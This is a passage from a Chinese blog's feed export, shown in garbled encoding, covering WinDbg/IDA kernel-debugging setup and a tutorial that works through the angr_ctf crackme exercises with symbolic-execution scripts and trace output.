<h2 id="ç‰©ç†æœºå‡†å¤‡"><a href="#ç‰©ç†æœºå‡†å¤‡" class="headerlink" title="ç‰©ç†æœºå‡†å¤‡"></a>ç‰©ç†æœºå‡†å¤‡</h2><p>è™šæ‹Ÿæœºä¸Šé…ç½®å¥½åå…ˆæ‰“å¼€Windbgæ£€æŸ¥æ˜¯å¦èƒ½è¿›è¡Œå†…æ ¸è°ƒè¯•:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-135805.png" alt="image-20240928135805578"></p>
<p>å¦‚æœæˆåŠŸçš„è¯åº”è¯¥ä¼šæ˜¾ç¤ºå†…æ ¸æ–­åœ¨ä¸€ä¸ªç¡¬ä»¶æ–­ç‚¹ä¸Š:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-135901.png" alt="image-20240928135901744"></p>
<p>è¿™æ—¶å€™ç”¨IDAæ‰“å¼€è¦è°ƒè¯•çš„é©±åŠ¨æ–‡ä»¶(.sys) é€‰æ‹©Windbgè°ƒè¯•å™¨:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-140006.png" alt="image-20240928140006899"></p>
<p>é…ç½®è°ƒè¯•å™¨è®¾ç½®å¦‚ä¸‹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-140133.png" alt="image-20240928140133914"></p>
<p>Connection stringå¡«<code>com:port=//./pipe/com1,baud=115200,pipe</code> (å¦‚æœä¹‹å‰ç”¨çš„æ˜¯com1)</p>
<p>è¿™æ—¶å€™é€‰æ‹©Attach to process å¦‚æœæˆåŠŸçš„è¯ä¼šæ˜¾ç¤ºè™šæ‹Ÿæœºå†…æ ¸:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-140335.png" alt="image-20240928140335125"></p>
<p>ä¸‹å¥½æ–­ç‚¹åè¿è¡Œé™„åŠ åˆ°å†…æ ¸ä¸Šè¿›è¡Œè°ƒè¯• ä¸€å¼€å§‹ä¼šæ–­åœ¨ç¡¬ä»¶æ–­ç‚¹ä¸Š ç›´æ¥æ”¾è¡Œ è¿è¡Œä¼šè°ƒç”¨ç›®æ ‡é©±åŠ¨çš„ç¨‹åºåå†…æ ¸ä¼šæ–­åœ¨ä¹‹å‰ä¸‹å¥½çš„æ–­ç‚¹ä¸Š</p>
]]></content>
      <categories>
        <category>Windowså†…æ ¸</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Angrå­¦ä¹ è®°å½•</title>
    <url>/2024/07/18/angr%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="Angrç®€ä»‹"><a href="#Angrç®€ä»‹" class="headerlink" title="Angrç®€ä»‹"></a>Angrç®€ä»‹</h2><p>Angræä¾›äº†ä¸€ä¸ªå¤„ç†äºŒè¿›åˆ¶æ–‡ä»¶çš„æ¡†æ¶ ä¸»æµçš„æŒ‡ä»¤é›†æŒ‡ä»¤åœ¨è¢«è½½å…¥<code>CLE</code>æ¡†æ¶å ä¼šæ ¹æ®åŠŸèƒ½è¢«æŠ½è±¡ä¸ºä¸­é—´è¯­è¨€(IL) Angræä¾›çš„å°±æ˜¯å¤„ç†è¿™äº›è¢«è½½å…¥ä¸ºILçš„ç¨‹åº å¯ä»¥ç”¨æ¥å®ç°è‡ªåŠ¨åŒ–çš„ç¨‹åºè°ƒè¯• ä¾‹å¦‚ç›´æ¥è½½å…¥ç¨‹åºç„¶ååƒæ¨¡æ‹Ÿçš„æ ‡å‡†è¾“å…¥æµè¾“å…¥æ•°æ®ä»¥è¾¾åˆ°ç›´æ¥åˆ©ç”¨åŸç¨‹åºè¿›è¡Œçˆ†ç ´çš„ç›®çš„ åŒæ—¶Angrè¿˜å†…ç½®äº†çº¦æŸæ±‚è§£å™¨</p>
<span id="more"></span>

<h2 id="åšåšé¢˜"><a href="#åšåšé¢˜" class="headerlink" title="åšåšé¢˜"></a>åšåšé¢˜</h2><p>ä¸‹é¢è·Ÿç€<a href="https://github.com/jakespringer/angr_ctf">Angr-ctf</a>é‡Œçš„é¢˜ç›®å­¦ä¹ Angrçš„åŸºç¡€åº”ç”¨</p>
<h3 id="angr-find"><a href="#angr-find" class="headerlink" title="angr_find"></a>angr_find</h3><p>IDAåŠ è½½é™„ä»¶çœ‹ä¸€ä¸‹ä»£ç :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">complex_function</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">64</span> || a1 &gt; <span class="number">90</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">3</span> * a2 + a1 - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">9</span>]; <span class="comment">// [esp+23h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s1[i] = complex_function(s1[i], i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;JACEJGCS&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç„¶ç›®æ ‡æ˜¯è¦è¿›å…¥è¾“å‡ºâ€Good Job.â€çš„åˆ†æ”¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/18/20240718-201751.png" alt="image-20240718201531013"></p>
<p>ç”¨angrçˆ†ç ´:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;00_angr_find&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"><span class="comment">#è½½å…¥äºŒè¿›åˆ¶ç¨‹åº å¹¶ä¸”ç¦ç”¨è‡ªåŠ¨åŠ è½½å¤–éƒ¨åŠ¨æ€è¿æ¥é€‰é¡¹ å¾—åˆ°projectå¯¹è±¡</span></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line"><span class="comment">#ç„¶åè·å–å½“å‰çš„æ¨¡æ‹Ÿç¨‹åºå¯¹è±¡(SimState) factoryæˆå‘˜æ‹¥æœ‰ä¸€ç³»åˆ—è½½å…¥äºŒè¿›åˆ¶æ–‡ä»¶çš„å±æ€§å’Œå¤„ç†æ–¹æ³• è€Œsimstateåˆ™åŒ…å«è°ƒè¯•è¿‡ç¨‹ä¸­çš„å¯„å­˜å™¨, å†…å­˜ç­‰ä¿¡æ¯</span></span><br><span class="line">simg = proj.factory.simgr(state)</span><br><span class="line"><span class="comment">#å¼€å§‹ç¬¦å·æ‰§è¡Œè½½å…¥çš„ç¨‹åº</span></span><br><span class="line">simg.explore(find=<span class="number">0x8048675</span>, avoid=<span class="number">0x8048663</span>)</span><br><span class="line"><span class="comment">#è®¾å®šç¨‹åºé¢„æœŸåˆ°è¾¾çš„åœ°å€å’Œé¢„æœŸé¿å…çš„åœ°å€</span></span><br><span class="line"><span class="built_in">print</span>(simg.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#ä»æ ‡å‡†è¾“å…¥æµè·å–ç»“æœ</span></span><br></pre></td></tr></table></figure>

<h3 id="angr-find-condition"><a href="#angr-find-condition" class="headerlink" title="angr_find_condition"></a>angr_find_condition</h3><p>ä¸»å‡½æ•°è¿›è¡Œäº†æ··æ·† åŠ å…¥äº†å¾ˆå¤šå®é™…ä¸Šæ§åˆ¶æµä¸ä¼šç»è¿‡çš„å— ä¸è¿‡è¿˜å¥½IDAçš„åæ±‡ç¼–åŠŸèƒ½æ¯”è¾ƒå¼ºå¤§ ä¼ªä»£ç çœ‹èµ·æ¥è¿˜æ˜¯å¾ˆæ¸…æ™°çš„:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/19/20240719-153407.png" alt="image-20240719153400747"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+18h] [ebp-40h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">20</span>]; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">20</span>]; <span class="comment">// [esp+38h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    s2[i] = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(s2, <span class="string">&quot;VXRRJEUR&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">    s1[j] = complex_function(s1[j], j + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•´ä½“é€»è¾‘å’Œå‰é¢çš„é¢˜åŸºæœ¬ç›¸åŒ å¼•å…¥æ–°çš„çˆ†ç ´æ–¹æ³• é¡ºä¾¿å€Ÿæœºç ”ç©¶ä»¥ä¸‹angræ‰§è¡Œçš„æ¨¡å¼:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr, sys</span><br><span class="line"></span><br><span class="line">eip_record = []</span><br><span class="line">branch_record = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_succ</span>(<span class="params">state</span>):</span><br><span class="line">    eip = state.regs.eip.args[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> eip <span class="keyword">not</span> <span class="keyword">in</span> eip_record:</span><br><span class="line">        eip_record.append(eip)</span><br><span class="line">    <span class="keyword">elif</span> eip <span class="keyword">not</span> <span class="keyword">in</span> branch_record:</span><br><span class="line">        branch_record.append(eip)</span><br><span class="line">    <span class="comment"># return eip == 0x804CA3A</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;EIP:&#x27;</span>, <span class="built_in">hex</span>(eip)[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_fail</span>(<span class="params">state</span>):</span><br><span class="line">    eip = state.regs.eip.args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return eip == 0x804CA25 </span></span><br><span class="line">    <span class="comment"># print(&#x27;Excute is fail&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    proj = angr.Project(<span class="string">&#x27;02_angr_find_condition&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>:<span class="literal">False</span>&#125;)</span><br><span class="line">    simstate = proj.factory.entry_state()</span><br><span class="line">    simmgr = proj.factory.simgr(simstate)</span><br><span class="line">    simmgr.explore(find=is_succ, avoid=is_fail)</span><br><span class="line">    <span class="comment"># ç”¨æ–°çš„åˆ¤æ–­å‡½æ•°æ¥åˆ¤æ–­æ˜¯å¦è¾¾æˆåŠŸ å¯ä»¥çœ‹å‡º å¦‚æœä¼ å…¥çš„æ˜¯æ•´æ•°å¯¹è±¡å°±ä¼šå¯¹æ¯”EIPå’Œç›®æ ‡æ•´æ•° å¦‚æœæ˜¯å‡½æ•°å¯¹è±¡å°±ä¼šæ‰§è¡Œå‡½æ•°æ ¹æ®è¿”å›å€¼åˆ¤æ–­æ˜¯å¦æˆåŠŸ</span></span><br><span class="line">    <span class="keyword">if</span> simmgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simmgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line">        <span class="comment"># print(&quot;\n&quot;.join([hex(addr) for addr in branch_record]))</span></span><br><span class="line">        <span class="comment"># print(&quot;\n&quot;.join([hex(addr) for addr in eip_record]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p>å»æ‰æ³¨é‡Šå†æ‰§è¡Œå¯ä»¥çœ‹åˆ°å®é™…ä¸Š<code>.explore</code>å‡½æ•°æ¯æ¬¡æ‰§è¡Œ<code>is_succ</code>çš„æ£€æµ‹åŒæ—¶ä¼šæ‰§è¡Œ<code>is_fail</code> è€Œæ¯ç»„æ‰§è¡Œçš„ä¸¤ä¸ªæ£€æµ‹ä¼ å…¥çš„<code>state</code>åŒ…å«äº†ç›¸åŒ(? è‡³å°‘EIPç›¸åŒ)çš„è¿è¡ŒçŠ¶æ€ é‚£ä¹ˆæ¥çœ‹çœ‹æ¯æ¬¡æ‰§è¡Œçš„æ—¶å€™EIPæ‰§è¡Œåˆ°äº†å“ªé‡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EIP: 8048450</span><br><span class="line">EIP: 8048420</span><br><span class="line">EIP: 8100014</span><br><span class="line">EIP: 804d290</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,957 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing register with an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | Filling register edi with 4 unconstrained bytes referenced from 0x804d291 (__libc_csu_init+0x1 in 02_angr_find_condition (0x804d291))</span><br><span class="line">WARNING  | 2024-07-19 15:11:59,959 | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx with 4 unconstrained bytes referenced from 0x804d293 (__libc_csu_init+0x3 in 02_angr_find_condition (0x804d293))</span><br><span class="line">EIP: 8048480</span><br><span class="line">EIP: 804d299</span><br><span class="line">EIP: 8048394</span><br><span class="line">EIP: 8048480</span><br><span class="line">EIP: 804839d</span><br><span class="line">EIP: 80483b2</span><br><span class="line">EIP: 804d2b1</span><br><span class="line">EIP: 804d2c0</span><br><span class="line">EIP: 8048520</span><br><span class="line">EIP: 804852b</span><br><span class="line">EIP: 80484c0</span><br><span class="line">EIP: 80484f3</span><br><span class="line">EIP: 804d2db</span><br><span class="line">EIP: 804d2e5</span><br><span class="line">EIP: 820104c</span><br><span class="line">EIP: 80485c8</span><br><span class="line">EIP: 804860b</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 80485fc</span><br><span class="line">EIP: 8048611</span><br><span class="line">EIP: 80483e0</span><br><span class="line">EIP: 8100004</span><br><span class="line">EIP: 804862e</span><br><span class="line">EIP: 8048430</span><br><span class="line">EIP: 8100018</span><br><span class="line">EIP: 8048642</span><br><span class="line">EIP: 804867f</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804864e</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048569</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 8048575</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048595</span><br><span class="line">EIP: 804857b</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 804866c</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 8048685</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8048692</span><br><span class="line">EIP: 8048588</span><br><span class="line">EIP: 804869f</span><br><span class="line">EIP: 80486ac</span><br><span class="line">EIP: 8048b6c</span><br><span class="line">EIP: 8048dcc</span><br><span class="line">EIP: 8048efc</span><br><span class="line">EIP: 8048f94</span><br><span class="line">EIP: 8048fde</span><br><span class="line">EIP: 80483d0</span><br><span class="line">EIP: 8100000</span><br><span class="line">WARNING  | 2024-07-19 15:12:01,375 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff2d with 11 unconstrained bytes referenced from 0x8100000 (strcmp+0x0 in extern-address space (0x0))</span><br><span class="line">WARNING  | 2024-07-19 15:12:01,379 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffeff50 with 4 unconstrained bytes referenced from 0x8100000 (strcmp+0x0 in extern-address space (0x0))</span><br><span class="line">EIP: 8048fee</span><br><span class="line">EIP: 804900a</span><br><span class="line">EIP: 8048ff5</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 8048400</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 810000c</span><br><span class="line">EIP: 8049017</span><br><span class="line">EIP: 8049002</span><br><span class="line">b&#x27;HETOBRCU&#x27;</span><br></pre></td></tr></table></figure>

<p>ç»“åˆIDAä¸­çš„æ±‡ç¼– æ¯ä¸€æ¬¡éƒ½æ˜¯æ‰§è¡Œåˆ°ä¸€ä¸ªå—(Block)çš„å¼€å¤´åœ°å€æ‰è°ƒç”¨æ£€æŸ¥å‡½æ•° å…³äºå— [å®˜æ–¹æ–‡æ¡£][<a href="https://docs.angr.io/en/latest/core-concepts/toplevel.html]%E6%9C%89%E8%A7%A3%E9%87%8A">https://docs.angr.io/en/latest/core-concepts/toplevel.html]æœ‰è§£é‡Š</a> å¯ä»¥çœ‹åˆ°å¾ªç¯çš„éƒ¨åˆ†ä¹Ÿè®°å½•äº†å¾ªç¯çš„æ¬¡æ•°æ¬¡ ä½†æ˜¯æœ‰åˆ†æ”¯çš„éƒ¨åˆ†ä¸¤ä¸ªåˆ†æ”¯éƒ½æœ‰è¢«è®°å½•è€Œä¸”è¢«è®°å½•çš„æ¬¡åºç´§æŒ¨ç€ è¿™é‡ŒçŒœæµ‹æ‰§è¡Œçš„æ¨¡å¼æ˜¯å…ˆæ‰«ææ‰€æœ‰å— ç„¶åå†åœ¨å…³é”®çš„å—è¿›è¡Œå¿«ç…§å¹¶çˆ†ç ´ ä»¥åå†ç»†ç©¶</p>
<h2 id="ä¸ºæŸæ®µç¨‹åºçš„ç¬¦å·æ‰§è¡Œè®¾å®šåˆå§‹å€¼"><a href="#ä¸ºæŸæ®µç¨‹åºçš„ç¬¦å·æ‰§è¡Œè®¾å®šåˆå§‹å€¼" class="headerlink" title="ä¸ºæŸæ®µç¨‹åºçš„ç¬¦å·æ‰§è¡Œè®¾å®šåˆå§‹å€¼"></a>ä¸ºæŸæ®µç¨‹åºçš„ç¬¦å·æ‰§è¡Œè®¾å®šåˆå§‹å€¼</h2><h3 id="angr-symbolic-registers-å¯„å­˜å™¨çš„åˆå§‹åŒ–"><a href="#angr-symbolic-registers-å¯„å­˜å™¨çš„åˆå§‹åŒ–" class="headerlink" title="angr_symbolic_registers | å¯„å­˜å™¨çš„åˆå§‹åŒ–"></a>angr_symbolic_registers | å¯„å­˜å™¨çš„åˆå§‹åŒ–</h3><p>ç¨‹åºè®¾ç½®çš„è¯»å…¥å‡½æ•°:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804890C                               ; int get_user_input()</span><br><span class="line">.text:0804890C                               public get_user_input</span><br><span class="line">.text:0804890C                               get_user_input proc near</span><br><span class="line">.text:0804890C</span><br><span class="line">.text:0804890C                               var_18= dword ptr -18h</span><br><span class="line">.text:0804890C                               var_14= dword ptr -14h</span><br><span class="line">.text:0804890C                               var_10= dword ptr -10h</span><br><span class="line">.text:0804890C                               var_C= dword ptr -0Ch</span><br><span class="line">.text:0804890C</span><br><span class="line">.text:0804890C                               ; __unwind &#123;</span><br><span class="line">.text:0804890C 55                            push    ebp</span><br><span class="line">.text:0804890D 89 E5                         mov     ebp, esp</span><br><span class="line">.text:0804890F 83 EC 18                      sub     esp, 18h</span><br><span class="line">.text:08048912 65 8B 0D 14 00 00 00          mov     ecx, large gs:14h</span><br><span class="line">.text:08048919 89 4D F4                      mov     [ebp+var_C], ecx</span><br><span class="line">.text:0804891C 31 C9                         xor     ecx, ecx</span><br><span class="line">.text:0804891E 8D 4D F0                      lea     ecx, [ebp+var_10]</span><br><span class="line">.text:08048921 51                            push    ecx</span><br><span class="line">.text:08048922 8D 4D EC                      lea     ecx, [ebp+var_14]</span><br><span class="line">.text:08048925 51                            push    ecx</span><br><span class="line">.text:08048926 8D 4D E8                      lea     ecx, [ebp+var_18]</span><br><span class="line">.text:08048929 51                            push    ecx</span><br><span class="line">.text:0804892A 68 93 8A 04 08                push    offset aXXX                     ; &quot;%x %x %x&quot;</span><br><span class="line">.text:0804892F E8 9C FA FF FF                call    ___isoc99_scanf</span><br><span class="line">.text:0804892F</span><br><span class="line">.text:08048934 83 C4 10                      add     esp, 10h</span><br><span class="line">.text:08048937 8B 4D E8                      mov     ecx, [ebp+var_18]</span><br><span class="line">.text:0804893A 89 C8                         mov     eax, ecx</span><br><span class="line">.text:0804893C 8B 4D EC                      mov     ecx, [ebp+var_14]</span><br><span class="line">.text:0804893F 89 CB                         mov     ebx, ecx</span><br><span class="line">.text:08048941 8B 4D F0                      mov     ecx, [ebp+var_10]</span><br><span class="line">.text:08048944 89 CA                         mov     edx, ecx</span><br><span class="line">.text:08048946 90                            nop</span><br><span class="line">.text:08048947 8B 4D F4                      mov     ecx, [ebp+var_C]</span><br><span class="line">.text:0804894A 65 33 0D 14 00 00 00          xor     ecx, large gs:14h</span><br><span class="line">.text:08048951 74 05                         jz      short locret_8048958</span><br><span class="line">.text:08048951</span><br><span class="line">.text:08048953 E8 48 FA FF FF                call    ___stack_chk_fail</span><br><span class="line">.text:08048953</span><br><span class="line">.text:08048958                               locret_8048958:                         ; CODE XREF: get_user_input+45â†‘j</span><br><span class="line">.text:08048958 C9                            leave</span><br><span class="line">.text:08048959 C3                            retn</span><br></pre></td></tr></table></figure>

